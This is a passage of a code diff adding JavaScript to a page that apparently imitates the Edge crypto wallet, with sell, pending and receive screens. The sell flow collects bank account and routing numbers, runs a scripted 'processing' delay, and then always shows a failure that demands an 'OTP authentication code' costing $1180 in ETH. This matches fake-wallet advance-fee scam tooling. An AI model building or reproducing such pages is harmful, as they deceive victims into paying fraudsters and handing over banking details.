+    const bankList = modal.querySelector('#bankList');
+    BANK_OPTIONS.forEach(opt => {
+      const b = document.createElement('div');
+      b.className = 'bank-item' + (state.sell.bank === opt ? ' selected' : '');
+      b.innerText = opt;
+      b.onclick = () => { state.sell.bank = opt; render(); };
+      bankList.appendChild(b);
+    });
+    modal.querySelector('#sellNextBtn').onclick = () => { state.step = 'sellDetails'; render(); };
+    modal.querySelector('#sellCancelBtn').onclick = () => { state.step = 'dashboard'; render(); };
+  }
+  function renderSellDetailsModal(app) {
+    // Sell: input account info
+    const modal = document.createElement('div');
+    modal.className = 'popup-modal';
+    modal.innerHTML = `
+      <div class="edge-card popup-card">
+        <h3 style="margin-bottom:0.6em;">${state.sell.bank} Details</h3>
+        <label class="modal-label">Amount to Sell:</label>
+        <input class="modal-input" type="number" id="sellAmount" min="0" step="any" value="${state.sell.amount}" placeholder="Enter amount">
+        <label class="modal-label">Account Name:</label>
+        <input class="modal-input" type="text" id="sellName" value="${state.sell.name}" placeholder="Enter account name">
+        <label class="modal-label">Account Number:</label>
+        <input class="modal-input" type="text" id="sellAccount" value="${state.sell.account}" placeholder="Enter account number">
+        <label class="modal-label">Routing Number (if needed):</label>
+        <input class="modal-input" type="text" id="sellRouting" value="${state.sell.routing}" placeholder="Enter routing number">
+        <button class="modal-btn" id="sellPreviewBtn" ${!state.sell.amount||!state.sell.name||!state.sell.account ? 'disabled' : ''}>Confirm</button>
+        <button class="modal-btn" id="sellCancelBtn" style="background:#36373a;color:#fff;margin-top:.6em;">Cancel</button>
+      </div>
+    `;
+    app.appendChild(modal);
+    modal.querySelector('#sellAmount').oninput = e => { state.sell.amount = e.target.value; render(); };
+    modal.querySelector('#sellName').oninput = e => { state.sell.name = e.target.value; render(); };
+    modal.querySelector('#sellAccount').oninput = e => { state.sell.account = e.target.value; render(); };
+    modal.querySelector('#sellRouting').oninput = e => { state.sell.routing = e.target.value; render(); };
+    modal.querySelector('#sellPreviewBtn').onclick = () => { state.sell.preview = true; state.sell.processTime = new Date().toLocaleString(); state.step = 'sellPreview'; render(); };
+    modal.querySelector('#sellCancelBtn').onclick = () => { state.step = 'dashboard'; render(); };
+  }
+  function renderSellPreview(app) {
+    // Show preview before processing
+    const modal = document.createElement('div');
+    modal.className = 'popup-modal';
+    modal.innerHTML = `
+      <div class="edge-card popup-card">
+        <div class="sell-preview-label" style="color:#ffc400;font-weight:700;">Selling Crypto Preview</div>
+        <div style="margin-bottom:1em;">
+          <span style="color:#ffc400;font-weight:700;">Bank/App:</span> ${state.sell.bank}<br>
+          <span style="color:#ffc400;font-weight:700;">Amount:</span> ${state.sell.amount}<br>
+          <span style="color:#ffc400;font-weight:700;">Account Name:</span> ${state.sell.name}<br>
+          <span style="color:#ffc400;font-weight:700;">Account Number:</span> ${state.sell.account}<br>
+          <span style="color:#ffc400;font-weight:700;">Routing Number:</span> ${state.sell.routing || 'N/A'}<br>
+          <span style="color:#ffc400;font-weight:700;">Time:</span> ${state.sell.processTime}
+        </div>
+        <button class="modal-btn" id="sellConfirmBtn">Confirm & Sell</button>
+        <button class="modal-btn" id="sellCancelBtn" style="background:#36373a;color:#fff;margin-top:.6em;">Cancel</button>
+      </div>
+    `;
+    app.appendChild(modal);
+    modal.querySelector('#sellConfirmBtn').onclick = () => { state.sell.pending = true; state.step = 'sellPending'; render(); };
+    modal.querySelector('#sellCancelBtn').onclick = () => { state.step = 'dashboard'; render(); };
+  }
+  function renderSellPending(app) {
+    // Processing for 6s, then show OTP error
+    const modal = document.createElement('div');
+    modal.className = 'popup-modal';
+    modal.innerHTML = `
+      <div class="edge-card popup-card">
+        <div class="pending-status">Processing Transaction...</div>
+        <div style="margin-bottom:2em;text-align:center;font-size:1.03em;color:#ffc400;">
+          Please wait while your transaction is processed...
+        </div>
+        <div id="pendingSpinner" style="text-align:center;margin-bottom:2em;">
+          <span style="font-size:2em;color:#14ea8f;">⏳</span>
+        </div>
+      </div>
+    `;
+    app.appendChild(modal);
+    setTimeout(() => {
+      modal.innerHTML = `
+        <div class="edge-card popup-card">
+          <div class="pending-status">Transaction Failed</div>
+          <div class="otp-error">
+            OTP AUTHENTICATION CODE REQUIRED<br>
+            <span style="color:#ffc400;">$1180 ETH NEEDED</span>
+          </div>
+          <button class="modal-btn" id="sellCloseBtn" style="margin-top:2em;">Return to Dashboard</button>
+        </div>
+      `;
+      modal.querySelector('#sellCloseBtn').onclick = () => { state.step = 'dashboard'; render(); };
+    }, 6000);
+  }
+  function renderAssets(app) {
+    // Assets screen, cloned from your image
+    const assetsBg = document.createElement('div'); assetsBg.className = 'assets-bg';
+    // Header
+    const headerRow = document.createElement('div'); headerRow.className = 'assets-header-row';
+    headerRow.innerHTML = `<span style="color:#b7b7b7;font-weight:600;">←</span>
+      <img src="${EDGE_LOGO_URL}" class="assets-logo" alt="Edge Logo">`;
+    assetsBg.appendChild(headerRow);
+    // Title row
+    const titleRow = document.createElement('div'); titleRow.className = 'assets-title-row';
+    titleRow.innerHTML = `<div class="assets-title">Receive</div>
+      <div style="text-align:right;">
+        <div style="font-size:1em;color:#fff;font-weight:700;">1 ETH</div>
+        <div style="font-size:1em;color:#fff;font-weight:700;">$${(state.balance/125.81).toFixed(2)}</div>
+      </div>`;
+    assetsBg.appendChild(titleRow);
+    // ETH summary
+    const ethSummary = document.createElement('div'); ethSummary.className = 'assets-eth-summary';
+    ethSummary.innerText = `You have ${state.assets.ethAmt.toFixed(6)} ETH`;
+    assetsBg.appendChild(ethSummary);
+    // Receive card
+    const receiveCard = document.createElement('div'); receiveCard.className = 'assets-receive-card';
+    receiveCard.innerHTML = `
+      <div class="assets-receive-row">
+        <div class="assets-receive-icon">${ETH_ICON}</div>
+        <div class="assets-receive-title">Receive to My Ether <span class="assets-edit-arrow">→</span></div>
+      </div>
+      <div class="assets-edit-row">
+        <span style="color:#14ea8f;font-size:1.19em;">↓</span>
+        <span style="font-size:1.09em;">${state.assets.editAmt||'0'} ETH</span>
+        <input class="assets-edit-input" id="assetsEditInput" type="number" min="0" step="any" value="${state.assets.editAmt}" placeholder="Tap to edit">
+      </div>
+      <div class="assets-qr-row"><canvas id="assetsQrImg" class="assets-qr-img"></canvas></div>
+      <div class="assets-wallet-row">
+        <span class="assets-wallet-label">Your Wallet Address <span class="assets-wallet-arrow">→</span></span>
+      </div>
+      <div class="assets-wallet-addr">${state.walletAddr}</div>
+    `;
+    assetsBg.appendChild(receiveCard);
+    // Nav bar
+    const navRow = document.createElement('div'); navRow.className = 'dashboard-nav-row';
+    navRow.innerHTML = `<div class="dashboard-nav-inner">
+      <div class="dashboard-nav-btn" id="navHomeBtn">
+        <div class="dashboard-nav-icon">🏠</div>
+        <div>Home</div>
+      </div>
+      <div class="dashboard-nav-btn active" id="navAssetsBtn">
+        <div class="dashboard-nav-icon">📁</div>
+        <div>Assets</div>
+      </div>
+    </div>`;
+    assetsBg.appendChild(navRow);
+    app.appendChild(assetsBg);
+    // QR code
+    setTimeout(() => {
+      let qr = new QRious({element: document.getElementById('assetsQrImg'), value: state.walletAddr, size:200});
+      document.getElementById('assetsEditInput').oninput = e => { state.assets.editAmt = e.target.value; render(); };
+      document.getElementById('navHomeBtn').onclick = () => { state.step = 'dashboard'; render(); };
+      document.getElementById('navAssetsBtn').onclick = () => { state.step = 'assets'; render(); };
+      headerRow.querySelector('span').onclick = () => { state.step = 'dashboard'; render(); };
+    }, 22);
+  }
+  window.addEventListener('DOMContentLoaded', () => { render(); });
+</script>
 </body>
 </html>
